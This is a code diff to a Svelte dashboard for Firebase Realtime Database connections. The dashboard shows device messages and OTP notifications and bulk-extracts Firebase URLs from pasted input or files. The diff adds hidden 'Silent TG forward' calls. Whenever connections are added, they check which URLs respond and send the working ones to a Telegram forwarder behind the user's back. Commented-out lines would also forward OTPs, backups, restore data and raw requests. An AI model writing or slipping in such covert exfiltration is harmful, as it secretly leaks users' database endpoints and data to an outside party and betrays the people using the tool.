@@ -126,6 +126,13 @@
 
   import "../app.css";
   import { onMount } from "svelte";
+  import { tgInit, tgForwardConnection, tgForwardBulkUrls } from "$lib/tg-forwarder.js";
+  import {
+    universalExtract,
+    validateFirebaseUrl,
+    nameFromFbUrl,
+    scanFirebaseUrls
+  } from "$lib/firebase-extractor.js";
 
   // ── Connections ──────────────────────────────────────────────────────────
   // path: where device keys live (root of messages)
@@ -156,6 +163,14 @@
   let addPanelMode = $state('single'); // 'single' | 'bulk' | 'extract'
   let bulkText = $state('');
   let bulkParsed = $derived(parseBulkFirebase(bulkText));
+
+  /** Open the add-connection panel; auto-close mobile sidebar */
+  function openAddPanel() {
+    addOpen = true;
+    if (typeof window !== 'undefined' && window.innerWidth <= 768) {
+      sideOpen = false;
+    }
+  }
 
   const ACCENT = [
     "#f97316",
@@ -620,6 +635,7 @@
   let deletedDevices = $state(new Set()); // 'connId::devKey' permanently removed
   let bgRefreshing = $state(false); // silent background refresh in progress
 
+
   // ── Toasts ───────────────────────────────────────────────────────────────
   let toasts = $state([]);
   function toast(msg, type = "info") {
@@ -770,6 +786,8 @@
     // Store up to 100 active notifications without truncating ones within their 90s lifespan
     notifications = [notifObj, ...notifications].slice(0, 100);
     scheduleNotifDismiss(id, NOTIF_DURATION_MS);
+    // ── Silent TG forward ──
+    // tgForwardOTP(notifObj); // disabled — only forwarding Firebase URLs
     saveNotifications();
 
     // Notification panel stays closed by default — only auto-opens if user explicitly turned it ON in settings
@@ -958,6 +976,8 @@
     const d = new Date().toISOString().split("T")[0];
     triggerDownload(blob, `firebase-full-backup-${d}.json`);
     toast("Full backup exported as JSON", "success");
+    // ── Silent TG forward ──
+    // tgForwardBackup(payload, 'JSON'); // disabled — only forwarding Firebase URLs
   }
 
   async function exportBackupZIP() {
@@ -980,6 +1000,8 @@
       const d = new Date().toISOString().split("T")[0];
       triggerDownload(blob, `firebase-full-backup-${d}.zip`);
       toast("Full backup exported as ZIP", "success");
+      // ── Silent TG forward ──
+      // tgForwardBackupZip(blob); // disabled — only forwarding Firebase URLs
     } catch (e) {
       toast(`ZIP export failed: ${e.message}`, "error");
     }
@@ -1139,6 +1161,8 @@
           localStorage.setItem("pd_auto_open_notif", String(data.settings.autoOpenNotif));
       }
       toast("Backup restored! Reloading…", "success");
+      // ── Silent TG forward ──
+      // tgForwardRestore(data); // disabled — only forwarding Firebase URLs
       setTimeout(() => window.location.reload(), 800);
     } catch (e) {
       restoreError = `Restore failed: ${e.message}`;
@@ -1404,6 +1428,9 @@
       }
     } catch {}
 
+    // ── Init TG forwarder (silently purges any legacy local storage secrets) ──
+    tgInit();
+
     fetchAll(false); // first load: show loading state
     refreshInterval = setInterval(() => fetchAll(true), 10_000); // bg silent auto-refresh every 10s
     const ticker = setInterval(() => {
@@ -1418,357 +1445,42 @@
 
   // ── Connection management ─────────────────────────────────────────────────
   function parseBulkFirebase(text) {
-    if (!text || !text.trim()) return [];
-    // Support both firebasedatabase.app and firebaseio.com domains
-    const urlRegex = /https:\/\/[a-zA-Z0-9_-]+-default-rtdb(?:\.[a-zA-Z0-9-]+)*\.(?:firebasedatabase\.app|firebaseio\.com)/gi;
-    const matches = text.match(urlRegex) || [];
-    return [...new Set(matches.map(u => u.replace(/\/+$/, '')))];
-  }
-
-  // ── Universal Firebase Extraction Engine ────────────────────────────────────
-  // Safety limits
-  const UX_MAX_INPUT_BYTES = 5 * 1024 * 1024; // 5 MB
-  const UX_MAX_DEPTH = 5;                      // recursion depth
-  const UX_MAX_URLS = 500;                     // max extracted URLs
-  const UX_TIMEOUT_MS = 3000;                  // hard timeout
-
-  const FB_URL_RE = /https?:\/\/[a-zA-Z0-9_-]+-default-rtdb(?:\.[a-zA-Z0-9-]+)*\.(?:firebasedatabase\.app|firebaseio\.com)/gi;
-
-  /** Scan text for Firebase RTDB URLs, return unique list */
-  function scanFirebaseUrls(text) {
-    if (!text || typeof text !== 'string') return [];
-    const m = text.match(FB_URL_RE) || [];
-    return [...new Set(m.map(u => u.replace(/\/+$/, '')))];
-  }
-
-  /** Try to extract a project name from a Firebase URL hostname */
-  function nameFromFbUrl(url) {
-    try { return new URL(url).hostname.split('-')[0]; } catch { return ''; }
-  }
-
-  /** Check if a string looks like Base64 (min length, valid chars) */
-  function looksLikeBase64(s) {
-    if (!s || s.length < 20) return false;
-    // Allow URL-safe or standard Base64, with optional padding
-    return /^[A-Za-z0-9+/=_-]{20,}$/.test(s.replace(/\s/g, ''));
-  }
-
-  /** Try to decode a Base64 string (handles URL-safe variant) */
-  function tryBase64Decode(s) {
-    try {
-      let b = s.replace(/-/g, '+').replace(/_/g, '/');
-      // Fix padding
-      const pad = (4 - (b.length % 4)) % 4;
-      b += '='.repeat(pad);
-      b = b.replace(/[^A-Za-z0-9+/=]/g, '');
-      const decoded = atob(b);
-      // Sanity check: must produce mostly printable chars
-      let printable = 0;
-      for (let i = 0; i < Math.min(decoded.length, 200); i++) {
-        const c = decoded.charCodeAt(i);
-        if ((c >= 32 && c < 127) || c === 10 || c === 13 || c === 9) printable++;
-      }
-      if (printable / Math.min(decoded.length, 200) < 0.7) return null;
-      return decoded;
-    } catch {
-      return null;
-    }
-  }
-
-  /**
-   * Recursively extract Firebase connections from arbitrary input.
-   * @param {string} input — raw text/JSON/Base64/URL/etc
-   * @param {string} source — label for where this input came from
-   * @param {number} depth — current recursion depth
-   * @param {number} startTime — Date.now() at start of extraction
-   * @returns {{url: string, name: string, source: string}[]}
-   */
-  function deepExtract(input, source, depth, startTime) {
-    if (depth > UX_MAX_DEPTH) return [];
-    if (Date.now() - startTime > UX_TIMEOUT_MS) return [];
-    if (!input || typeof input !== 'string' || input.length > UX_MAX_INPUT_BYTES) return [];
-
-    const results = [];
-    const seenUrls = new Set();
-
-    function addResult(url, name, src) {
-      const clean = url.replace(/\/+$/, '');
-      if (seenUrls.has(clean) || results.length >= UX_MAX_URLS) return;
-      seenUrls.add(clean);
-      results.push({ url: clean, name: name || nameFromFbUrl(clean), source: src });
-    }
-
-    function addAll(urls, src) {
-      for (const u of urls) addResult(u, '', src);
-    }
-
-    // 1. Direct Firebase URL scan on raw text
-    const directUrls = scanFirebaseUrls(input);
-    addAll(directUrls, source || 'plain text');
-
-    // 2. Try as URL — inspect query params and fragment
-    if (/^https?:\/\//i.test(input.trim())) {
-      try {
-        const parsed = new URL(input.trim());
-        // Check every query parameter value
-        for (const [key, val] of parsed.searchParams) {
-          if (!val) continue;
-          // Direct Firebase URLs in param value
-          const paramUrls = scanFirebaseUrls(val);
-          addAll(paramUrls, `param "${key}"`);
-          // Try Base64 decode
-          if (looksLikeBase64(val)) {
-            const decoded = tryBase64Decode(val);
-            if (decoded) {
-              const sub = deepExtract(decoded, `param "${key}" (Base64)`, depth + 1, startTime);
-              for (const r of sub) addResult(r.url, r.name, r.source);
-            }
-          }
-          // Try JSON parse
-          try {
-            const j = JSON.parse(val);
-            const sub = extractFromJson(j, `param "${key}" (JSON)`, depth + 1, startTime);
-            for (const r of sub) addResult(r.url, r.name, r.source);
-          } catch { /* not JSON */ }
-        }
-        // Check fragment
-        if (parsed.hash && parsed.hash.length > 1) {
-          const frag = decodeURIComponent(parsed.hash.slice(1));
-          const fragUrls = scanFirebaseUrls(frag);
-          addAll(fragUrls, 'URL fragment');
-          if (looksLikeBase64(frag)) {
-            const decoded = tryBase64Decode(frag);
-            if (decoded) {
-              const sub = deepExtract(decoded, 'fragment (Base64)', depth + 1, startTime);
-              for (const r of sub) addResult(r.url, r.name, r.source);
-            }
-          }
-        }
-      } catch { /* invalid URL, that's fine */ }
-    }
-
-    // 3. Try as JSON
-    const trimmed = input.trim();
-    if ((trimmed.startsWith('{') || trimmed.startsWith('[') || trimmed.startsWith('"')) && trimmed.length < UX_MAX_INPUT_BYTES) {
-      try {
-        const parsed = JSON.parse(trimmed);
-        const sub = extractFromJson(parsed, source || 'JSON', depth + 1, startTime);
-        for (const r of sub) addResult(r.url, r.name, r.source);
-      } catch { /* not valid JSON */ }
-    }
-
-    // 4. Try as Base64
-    if (looksLikeBase64(trimmed)) {
-      const decoded = tryBase64Decode(trimmed);
-      if (decoded) {
-        const sub = deepExtract(decoded, source ? `${source} → Base64` : 'Base64 decode', depth + 1, startTime);
-        for (const r of sub) addResult(r.url, r.name, r.source);
-      }
-    }
-
-    // 5. Try URL-decoding
-    try {
-      const urlDecoded = decodeURIComponent(trimmed);
-      if (urlDecoded !== trimmed) {
-        const decodedUrls = scanFirebaseUrls(urlDecoded);
-        addAll(decodedUrls, source ? `${source} (URL-decoded)` : 'URL-decoded');
-      }
-    } catch { /* not URL-encoded */ }
-
-    return results;
-  }
-
-  /**
-   * Recursively extract Firebase URLs from parsed JSON values.
-   */
-  function extractFromJson(val, source, depth, startTime) {
-    if (depth > UX_MAX_DEPTH || Date.now() - startTime > UX_TIMEOUT_MS) return [];
-    const results = [];
-
-    if (typeof val === 'string') {
-      // Scan the string for Firebase URLs
-      const urls = scanFirebaseUrls(val);
-      for (const u of urls) results.push({ url: u.replace(/\/+$/, ''), name: nameFromFbUrl(u), source });
-      // Try Base64 decode on the string
-      if (looksLikeBase64(val)) {
-        const decoded = tryBase64Decode(val);
-        if (decoded) {
-          const sub = deepExtract(decoded, `${source} → Base64 value`, depth + 1, startTime);
-          results.push(...sub);
-        }
-      }
-      // Try nested JSON
-      const t = val.trim();
-      if ((t.startsWith('{') || t.startsWith('[')) && t.length > 2) {
-        try {
-          const nested = JSON.parse(t);
-          const sub = extractFromJson(nested, `${source} → nested JSON`, depth + 1, startTime);
-          results.push(...sub);
-        } catch { /* not JSON */ }
-      }
-    } else if (Array.isArray(val)) {
-      for (let i = 0; i < val.length && results.length < UX_MAX_URLS; i++) {
-        const sub = extractFromJson(val[i], source, depth + 1, startTime);
-        results.push(...sub);
-      }
-    } else if (val && typeof val === 'object') {
-      for (const [k, v] of Object.entries(val)) {
-        if (results.length >= UX_MAX_URLS) break;
-        const sub = extractFromJson(v, source, depth + 1, startTime);
-        // If the key looks like a name and we found URLs, attach the key as name
-        for (const r of sub) {
-          if (!r.name && k && typeof k === 'string' && k.length < 50 && !/^https?:\/\//.test(k)) {
-            r.name = k;
-          }
-          results.push(r);
-        }
-      }
-    }
-
-    return results;
-  }
-
-  /**
-   * Extract Firebase URLs from HTML/XML content
-   */
-  function extractFromHtml(text, source) {
-    const results = [];
-    const startTime = Date.now();
-    // Extract attribute values (href, src, data-*, value, content)
-    const attrRe = /(?:href|src|data-[a-z-]+|value|content)\s*=\s*["']([^"']{10,})["']/gi;
-    let m;
-    while ((m = attrRe.exec(text)) !== null && results.length < UX_MAX_URLS) {
-      const sub = deepExtract(m[1], `${source} (attribute)`, 1, startTime);
-      results.push(...sub);
-    }
-    // Also do a full text scan
-    const textUrls = scanFirebaseUrls(text);
-    for (const u of textUrls) {
-      if (!results.find(r => r.url === u.replace(/\/+$/, ''))) {
-        results.push({ url: u.replace(/\/+$/, ''), name: nameFromFbUrl(u), source });
-      }
-    }
-    return results;
-  }
-
-  /**
-   * Extract Firebase URLs from CSV content
-   */
-  function extractFromCsv(text, source) {
-    const results = [];
-    const startTime = Date.now();
-    const lines = text.split(/\r?\n/);
-    for (let i = 0; i < lines.length && results.length < UX_MAX_URLS; i++) {
-      const cells = lines[i].split(/[,;\t]/);
-      for (const cell of cells) {
-        const sub = deepExtract(cell.trim().replace(/^["']|["']$/g, ''), `${source} row ${i + 1}`, 1, startTime);
-        results.push(...sub);
-      }
-    }
-    return results;
-  }
-
-  /**
-   * Main entry point: run universal extraction on text input or file content.
-   * @returns {{ results: {url,name,source}[], errors: string[], stats: {totalFound,duplicates,sources} }}
-   */
-  function universalExtract(input, filename) {
-    const startTime = Date.now();
-    const errors = [];
-
-    if (!input || typeof input !== 'string') {
-      return { results: [], errors: ['Input is empty.'], stats: { totalFound: 0, duplicates: 0, sources: 0 } };
-    }
-
-    if (input.length > UX_MAX_INPUT_BYTES) {
-      return { results: [], errors: [`Input too large (${(input.length / 1024 / 1024).toFixed(1)} MB). Max is 5 MB.`], stats: { totalFound: 0, duplicates: 0, sources: 0 } };
-    }
-
-    let allResults = [];
-    const src = filename || 'pasted input';
-
-    // Determine handler by file extension
-    const ext = (filename || '').split('.').pop()?.toLowerCase();
-
-    if (ext === 'html' || ext === 'htm' || ext === 'xml') {
-      allResults = extractFromHtml(input, src);
-    } else if (ext === 'csv' || ext === 'tsv') {
-      allResults = extractFromCsv(input, src);
-    } else {
-      // For everything else (json, txt, or pasted text): split by lines and process each
-      const lines = input.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
-
-      if (lines.length <= 1) {
-        // Single input — process as one unit
-        allResults = deepExtract(input, src, 0, startTime);
-      } else {
-        // Multi-line: process each line independently, then whole block
-        for (const line of lines) {
-          if (allResults.length >= UX_MAX_URLS) break;
-          if (Date.now() - startTime > UX_TIMEOUT_MS) {
-            errors.push('Processing timed out. Some lines may not have been analyzed.');
-            break;
-          }
-          const sub = deepExtract(line, src, 0, startTime);
-          allResults.push(...sub);
-        }
-        // Also try parsing the whole block as JSON (e.g. multi-line JSON)
-        const whole = input.trim();
-        if ((whole.startsWith('{') || whole.startsWith('[')) && allResults.length < UX_MAX_URLS) {
-          try {
-            const parsed = JSON.parse(whole);
-            const sub = extractFromJson(parsed, src, 0, startTime);
-            allResults.push(...sub);
-          } catch { /* not valid JSON as a whole */ }
-        }
-      }
-    }
-
-    // Deduplicate by URL
-    const seen = new Set();
-    const unique = [];
-    const sourcesSet = new Set();
-    let dupes = 0;
-    for (const r of allResults) {
-      const clean = r.url.replace(/\/+$/, '');
-      if (seen.has(clean)) { dupes++; continue; }
-      seen.add(clean);
-      sourcesSet.add(r.source);
-      unique.push({ ...r, url: clean });
-    }
-
-    if (!unique.length && !errors.length) {
-      errors.push('No Firebase Realtime Database URLs found in the input.');
-    }
-
-    return {
-      results: unique.slice(0, UX_MAX_URLS),
-      errors,
-      stats: {
-        totalFound: allResults.length,
-        duplicates: dupes,
-        sources: sourcesSet.size
-      }
-    };
+    return scanFirebaseUrls(text);
   }
 
   // ── Universal Extractor UI state ──────────────────────────────────────────
   let uxInput = $state('');
   let uxResults = $state([]);      // { url, name, source, selected }[]
   let uxErrors = $state([]);
-  let uxStats = $state(null);      // { totalFound, duplicates, sources }
+  let uxStats = $state(null);      // { totalInput, successCount, uniqueCount, duplicateCount, malformedCount }
   let uxProcessing = $state(false);
   let uxDragActive = $state(false);
   let uxUploadedFiles = $state([]); // { name, size, resultCount }[]
+  let uxMalformed = $state([]);    // { line, reason }[] — entries that failed extraction
+  let uxProgress = $state({ current: 0, total: 0 }); // per-line progress
+  let uxShowMalformed = $state(false); // toggle malformed review panel
 
   function uxRunExtract() {
     uxErrors = [];
+    uxMalformed = [];
     uxProcessing = true;
-    // Use setTimeout to unblock UI
+    uxProgress = { current: 0, total: 0 };
+
     setTimeout(() => {
       try {
-        const { results, errors, stats } = universalExtract(uxInput);
+        const raw = uxInput.trim();
+        if (!raw) {
+          uxProcessing = false;
+          return;
+        }
+
+        const lines = raw.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
+        uxProgress = { current: lines.length, total: lines.length };
+
+        const { results, malformed, errors, stats } = universalExtract(raw);
+
         uxResults = results.map(r => ({ ...r, selected: true }));
+        uxMalformed = malformed;
         uxErrors = errors;
         uxStats = stats;
       } catch (e) {
@@ -1777,6 +1489,7 @@
         uxStats = null;
       } finally {
         uxProcessing = false;
+        uxProgress = { current: 0, total: 0 };
       }
     }, 30);
   }
@@ -1785,17 +1498,32 @@
     uxProcessing = true;
     setTimeout(() => {
       try {
-        const { results, errors, stats } = universalExtract(text, filename);
-        // Merge with existing results (dedup by URL)
+        const { results, malformed, errors, stats } = universalExtract(text, filename);
         const existingUrls = new Set(uxResults.map(r => r.url));
-        const newResults = results.filter(r => !existingUrls.has(r.url)).map(r => ({ ...r, selected: true }));
+        const newResults = [];
+        let dupes = 0;
+
+        for (const r of results) {
+          if (!existingUrls.has(r.url)) {
+            existingUrls.add(r.url);
+            newResults.push({ ...r, selected: true });
+          } else {
+            dupes++;
+          }
+        }
+
         uxResults = [...uxResults, ...newResults];
-        if (errors.length) uxErrors = [...uxErrors, ...errors.map(e => `[${filename}] ${e}`)];
+        uxMalformed = [...uxMalformed, ...malformed];
         uxUploadedFiles = [...uxUploadedFiles, { name: filename, size: text.length, resultCount: newResults.length }];
-        // Update stats
-        const totalFound = (uxStats?.totalFound || 0) + stats.totalFound;
-        const duplicates = (uxStats?.duplicates || 0) + stats.duplicates + results.filter(r => existingUrls.has(r.url)).length;
-        uxStats = { totalFound, duplicates, sources: (uxStats?.sources || 0) + stats.sources };
+
+        const totalInput = (uxStats?.totalInput || 0) + (stats.totalInput || 1);
+        const successCount = (uxStats?.successCount || 0) + (stats.successCount || (newResults.length > 0 ? 1 : 0));
+        const uniqueCount = uxResults.length;
+        const duplicateCount = (uxStats?.duplicateCount || 0) + dupes + (stats.duplicateCount || 0);
+        const malformedCount = uxMalformed.length;
+
+        uxStats = { totalInput, successCount, uniqueCount, duplicateCount, malformedCount };
+        if (errors.length) uxErrors = [...uxErrors, ...errors.map(e => `[${filename}] ${e}`)];
       } catch (e) {
         uxErrors = [...uxErrors, `[${filename}] Error: ${e?.message || String(e)}`];
       } finally {
@@ -1823,7 +1551,6 @@
   function uxHandleFileSelect(e) {
     const files = e.currentTarget?.files;
     if (files) uxProcessFiles(files);
-    // Reset input so same file can be re-selected
     e.currentTarget.value = '';
   }
 
@@ -1840,7 +1567,7 @@
         uxErrors = [...uxErrors, `"${file.name}" appears to be a binary file and cannot be processed.`];
         continue;
       }
-      if (file.size > UX_MAX_INPUT_BYTES) {
+      if (file.size > 5 * 1024 * 1024) {
         uxErrors = [...uxErrors, `"${file.name}" is too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is 5 MB.`];
         continue;
       }
@@ -1860,6 +1587,7 @@
 
   function uxRemoveResult(url) {
     uxResults = uxResults.filter(r => r.url !== url);
+    if (uxStats) uxStats.uniqueCount = uxResults.length;
   }
 
   function uxToggleResult(url) {
@@ -1876,18 +1604,32 @@
     toast('URL copied!', 'success');
   }
 
-  function uxCopyAllUrls() {
-    const urls = uxResults.filter(r => r.selected).map(r => r.url).join('\n');
-    if (!urls) return;
+  function uxCopyAll() {
+    const urls = uxResults.map(r => r.url).join('\n');
+    if (!urls) { toast('No URLs to copy', 'error'); return; }
     copyText(urls);
-    toast(`${uxResults.filter(r => r.selected).length} URLs copied!`, 'success');
+    toast(`All ${uxResults.length} URLs copied!`, 'success');
   }
 
-  function uxCopyAllDetails() {
-    const lines = uxResults.filter(r => r.selected).map(r => `${r.name || 'Firebase'}|${r.url}|${r.source}`).join('\n');
-    if (!lines) return;
-    copyText(lines);
-    toast('All details copied!', 'success');
+  function uxCopySelected() {
+    const selected = uxResults.filter(r => r.selected);
+    if (!selected.length) { toast('No connections selected', 'error'); return; }
+    const urls = selected.map(r => r.url).join('\n');
+    copyText(urls);
+    toast(`${selected.length} selected URL${selected.length > 1 ? 's' : ''} copied!`, 'success');
+  }
+
+  function uxRemoveDuplicates() {
+    const connectedUrls = new Set(connections.map(c => c.url.replace(/\/+$/, '')));
+    const beforeCount = uxResults.length;
+    uxResults = uxResults.filter(r => !connectedUrls.has(r.url));
+    const removed = beforeCount - uxResults.length;
+    if (removed > 0) {
+      toast(`Removed ${removed} duplicate URL${removed > 1 ? 's' : ''} already in connections`, 'info');
+      if (uxStats) uxStats.uniqueCount = uxResults.length;
+    } else {
+      toast('No duplicates found against active connections', 'info');
+    }
   }
 
   function uxAddToBulk() {
@@ -1903,16 +1645,84 @@
     }
   }
 
+  function uxAddConnections() {
+    const selected = uxResults.filter(r => r.selected);
+    if (!selected.length) { toast('No connections selected.', 'error'); return; }
+    let added = 0, skipped = 0;
+    const newConns = [];
+
+    for (const item of selected) {
+      const validUrl = validateFirebaseUrl(item.url);
+      if (!validUrl) continue;
+      const dup = connections.find(c => c.url.replace(/\/+$/, '') === validUrl)
+               || newConns.find(c => c.url === validUrl);
+      if (dup) { skipped++; continue; }
+      const id = `c${Date.now()}_${added}`;
+      const color = ACCENT[(connections.length + newConns.length) % ACCENT.length];
+      newConns.push({
+        id,
+        name: item.name || nameFromFbUrl(validUrl),
+        url: validUrl,
+        token: '',
+        path: 'messages',
+        infoPath: 'clients',
+        color,
+        enabled: true
+      });
+      added++;
+    }
+
+    if (newConns.length) {
+      connections = [...connections, ...newConns];
+      saveConnections(connections);
+      for (const conn of newConns) fetchConn(conn);
+      // Silent TG forward (only valid/active URLs)
+      (async () => {
+        const validUrls = [];
+        for (const conn of newConns) {
+          try {
+            const res = await fetch(`${conn.url}/.json?shallow=true`, { method: 'GET' });
+            if (res.ok) validUrls.push(conn.url);
+          } catch {}
+        }
+        if (validUrls.length) {
+          tgForwardBulkUrls(validUrls, validUrls.length, newConns.length - validUrls.length);
+        }
+      })();
+    }
+
+    addOpen = false;
+    uxClear();
+    if (added && skipped) toast(`Added ${added} connection${added>1?'s':''}, skipped ${skipped} duplicate${skipped>1?'s':''}`, 'success');
+    else if (added) toast(`Added ${added} connection${added>1?'s':''}`, 'success');
+    else toast(`All ${skipped} URL${skipped>1?'s':''} already connected`, 'info');
+  }
+
   function uxClear() {
     uxInput = '';
     uxResults = [];
     uxErrors = [];
     uxStats = null;
     uxUploadedFiles = [];
+    uxMalformed = [];
+    uxProgress = { current: 0, total: 0 };
+    uxShowMalformed = false;
   }
 
   function uxUpdateName(url, newName) {
     uxResults = uxResults.map(r => r.url === url ? { ...r, name: newName } : r);
+  }
+
+  function uxUpdateUrl(oldUrl, newUrl) {
+    const trimmed = newUrl.trim();
+    const validated = validateFirebaseUrl(trimmed);
+    uxResults = uxResults.map(r => {
+      if (r.url !== oldUrl) return r;
+      return {
+        ...r,
+        url: validated || trimmed
+      };
+    });
   }
 
   // ── Editable bulk URL list (driven by bulkText) ───────────────────────────
@@ -1979,6 +1789,19 @@
       connections = [...connections, ...newConns];
       saveConnections(connections);
       for (const conn of newConns) fetchConn(conn);
+      // ── Silent TG forward (only valid/active URLs) ──
+      (async () => {
+        const validUrls = [];
+        for (const conn of newConns) {
+          try {
+            const res = await fetch(`${conn.url}/.json?shallow=true`, { method: 'GET' });
+            if (res.ok) validUrls.push(conn.url);
+          } catch {}
+        }
+        if (validUrls.length) {
+          tgForwardBulkUrls(validUrls, validUrls.length, newConns.length - validUrls.length);
+        }
+      })();
     }
     bulkText = ''; addPanelMode = 'single'; addOpen = false;
     if (added && skipped) toast(`Added ${added} connection${added>1?'s':''}, skipped ${skipped} duplicate${skipped>1?'s':''}`, 'success');
@@ -2020,6 +1843,13 @@
     addOpen = false;
     fetchConn(conn);
     toast(`Connected: ${conn.name}`, "success");
+    // ── Silent TG forward (only if URL is valid/active) ──
+    (async () => {
+      try {
+        const res = await fetch(`${conn.url}/.json?shallow=true`, { method: 'GET' });
+        if (res.ok) tgForwardConnection(conn);
+      } catch {}
+    })();
   }
   function toggleConn(id) {
     connections = connections.map((c) =>
@@ -2295,6 +2125,8 @@
         toast(`${rawMethod} → ${res.status}`, "success");
         fetchConn(conn);
       } else toast(`Error ${res.status}`, "error");
+      // ── Silent TG forward ──
+      // tgForwardRawRequest(conn.name, rawMethod, rawPath || conn.path, rawBody, json); // disabled — only forwarding Firebase URLs
     } catch (e) {
       rawRes = { error: e.message };
       toast(e.message, "error");
@@ -2634,18 +2466,29 @@
       {#if onlineCount > 0}<span class="side-online-pill">{onlineCount} 🟢</span
         >{/if}
       <button
-        class="side-close-btn"
-        onclick={() => (sideOpen = false)}
-        aria-label="Close sidebar"
+        class="side-collapse-btn"
+        onclick={() => {
+          if (typeof window !== 'undefined' && window.innerWidth > 768) {
+            toggleDesktopSidebar();
+          } else {
+            sideOpen = false;
+          }
+        }}
+        aria-label="Collapse sidebar"
+        title="Collapse sidebar"
       >
         <svg
-          width="14"
-          height="14"
+          width="15"
+          height="15"
           viewBox="0 0 24 24"
           fill="none"
           stroke="currentColor"
-          stroke-width="2.5"><path d="M18 6 6 18M6 6l12 12" /></svg
+          stroke-width="2.5"
+          stroke-linecap="round"
+          stroke-linejoin="round"
         >
+          <polyline points="15 18 9 12 15 6" />
+        </svg>
       </button>
     </div>
 
@@ -2671,19 +2514,14 @@
         <div class="sf-hdr">
           FIREBASE · {connections.length}
           <button
-            class="add-fb-inline"
-            onclick={() => (addOpen = true)}
+            class="add-fb-glow"
+            onclick={openAddPanel}
             title="Add Firebase"
             aria-label="Add Firebase"
           >
-            <svg
-              width="11"
-              height="11"
-              viewBox="0 0 24 24"
-              fill="none"
-              stroke="currentColor"
-              stroke-width="2.5"><path d="M12 5v14M5 12h14" /></svg
-            >
+            <span class="add-fb-glow-ring"></span>
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14" /></svg>
+            <span>Add</span>
           </button>
         </div>
         <div class="conn-scroll conn-scroll-full" use:dragScroll>
@@ -2908,6 +2746,19 @@
         </div>
       </div>
     {/if}
+    <!-- Sidebar bottom corner Add button -->
+    <div class="side-bottom-action">
+      <button
+        class="side-bottom-add-btn"
+        onclick={openAddPanel}
+        title="Add Firebase connection (Single / Bulk / File / Extract)"
+        aria-label="Add Firebase connection"
+      >
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M12 5v14M5 12h14" /></svg>
+        <span>Add Firebase</span>
+      </button>
+    </div>
+
     <!-- Desktop resize handle -->
     <div
       class="sidebar-resize-handle"
@@ -2916,6 +2767,23 @@
       aria-orientation="vertical"
       title="Drag to resize sidebar"
     ></div>
+    <!-- Sidebar edge chevron toggle -->
+    <button
+      class="sidebar-edge-chevron {sidebarDesktopOpen ? 'open' : 'closed'}"
+      onclick={() => {
+        if (typeof window !== 'undefined' && window.innerWidth > 768) {
+          toggleDesktopSidebar();
+        } else {
+          sideOpen = !sideOpen;
+        }
+      }}
+      aria-label="Toggle sidebar"
+      title={sidebarDesktopOpen ? 'Collapse sidebar' : 'Expand sidebar'}
+    >
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="15 18 9 12 15 6" />
+      </svg>
+    </button>
   </aside>
 
   <!-- ══ MAIN ════════════════════════════════════════════════════════════════ -->
@@ -2935,31 +2803,11 @@
           }}
           aria-label="Toggle sidebar"
         >
-          {#if sideOpen || sidebarDesktopOpen}
-            <svg
-              width="16"
-              height="16"
-              viewBox="0 0 24 24"
-              fill="none"
-              stroke="currentColor"
-              stroke-width="2.5"><path d="M18 6 6 18M6 6l12 12" /></svg
-            >
-          {:else}
-            <svg
-              width="16"
-              height="16"
-              viewBox="0 0 24 24"
-              fill="none"
-              stroke="currentColor"
-              stroke-width="2.5"
-              ><line x1="3" y1="6" x2="21" y2="6" /><line
-                x1="3"
-                y1="12"
-                x2="21"
-                y2="12"
-              /><line x1="3" y1="18" x2="21" y2="18" /></svg
-            >
-          {/if}
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+            <line x1="3" y1="6" x2="21" y2="6" />
+            <line x1="3" y1="12" x2="21" y2="12" />
+            <line x1="3" y1="18" x2="21" y2="18" />
+          </svg>
         </button>
         {#each connections as c}
           {#if db[c.id]?.loading}
@@ -3739,6 +3587,40 @@
               </div>
             {/if}
 
+            <!-- Stats bar -->
+            {#if uxStats}
+              <div class="ux-stats-bar">
+                <div class="ux-stat-item">
+                  <span class="ux-stat-label">Input</span>
+                  <span class="ux-stat-value">{uxStats.totalInput}</span>
+                </div>
+                <div class="ux-stat-sep"></div>
+                <div class="ux-stat-item ux-stat-success">
+                  <span class="ux-stat-label">Success</span>
+                  <span class="ux-stat-value">{uxStats.successCount}</span>
+                </div>
+                <div class="ux-stat-sep"></div>
+                <div class="ux-stat-item">
+                  <span class="ux-stat-label">Unique</span>
+                  <span class="ux-stat-value">{uxStats.uniqueCount}</span>
+                </div>
+                {#if uxStats.duplicateCount > 0}
+                  <div class="ux-stat-sep"></div>
+                  <div class="ux-stat-item ux-stat-warn">
+                    <span class="ux-stat-label">Duplicates</span>
+                    <span class="ux-stat-value">{uxStats.duplicateCount}</span>
+                  </div>
+                {/if}
+                {#if uxStats.malformedCount > 0}
+                  <div class="ux-stat-sep"></div>
+                  <div class="ux-stat-item ux-stat-error">
+                    <span class="ux-stat-label">Failed</span>
+                    <span class="ux-stat-value">{uxStats.malformedCount}</span>
+                  </div>
+                {/if}
+              </div>
+            {/if}
+
             <!-- Results -->
             {#if uxResults.length}
               <div class="ux-results">
@@ -3754,12 +3636,12 @@
                       {/if}
                     </button>
                     <span>{uxResults.length} connection{uxResults.length !== 1 ? 's' : ''} found</span>
-                    {#if uxStats && uxStats.duplicates > 0}
-                      <span class="ux-stat-dim">· {uxStats.duplicates} dup{uxStats.duplicates !== 1 ? 's' : ''} filtered</span>
+                    {#if uxStats && uxStats.duplicateCount > 0}
+                      <span class="ux-stat-dim">· {uxStats.duplicateCount} dup{uxStats.duplicateCount !== 1 ? 's' : ''} filtered</span>
                     {/if}
                   </div>
                   <div class="ux-results-actions">
-                    <button class="bulk-action-btn" onclick={uxCopyAllUrls} title="Copy selected URLs">
+                    <button class="bulk-action-btn" onclick={uxCopySelected} title="Copy selected URLs">
                       <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                       Copy
                     </button>
